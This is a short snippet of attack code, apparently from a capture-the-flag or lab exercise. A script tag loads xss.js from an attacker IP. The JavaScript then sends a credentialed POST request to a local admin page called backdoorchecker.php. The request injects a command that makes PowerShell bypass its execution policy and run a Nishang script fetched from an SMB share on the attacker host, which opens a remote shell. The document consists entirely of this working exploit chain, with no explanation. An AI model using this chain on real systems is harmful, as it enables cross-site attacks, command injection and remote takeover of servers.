<script src=http://10.10.14.39/xss.js></script>

var xhr = new XMLHttpRequest();
var url = "http://localhost/admin/backdoorchecker.php";
var params = "cmd=dir | powershell -exec bypass -f \\\\10.10.14.39\\Red\\nishang.ps1";
xhr.open("POST", url);
xhr.setRequestHeader('Content-Type', 'Application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send(params);

